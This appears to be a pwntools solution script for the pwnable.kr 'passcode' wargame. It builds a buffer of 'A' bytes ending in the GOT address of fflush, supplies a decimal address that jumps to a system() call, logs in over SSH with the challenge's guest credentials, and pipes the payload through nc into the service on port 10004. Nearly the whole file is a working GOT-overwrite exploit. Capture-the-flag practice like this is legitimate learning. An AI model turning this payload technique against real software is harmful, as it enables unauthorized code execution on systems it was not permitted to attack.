from pwn import ssh, p32

# address of a lea eax,[ebx-0x1fb9] instruction before call to system()
# 0x080492bd (134517437 in decimal)

# address of flush() from .rel.plt section of the executable
# 0x0804c014 -> \x14\xc0\x04\x08

payload = b"A"*96
payload += p32(0x0804c014)
payload += b"\n"
payload += b"134517437"
payload += b"\n"
payload += b"arbitrary"

attack = "cat /tmp/testing | nc 0 10004\n"

remote = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
remote.upload_data(payload, "/tmp/testing")
proc = remote.run("bash")
print(f"\nAttack with this::: {attack}")
proc.interactive()
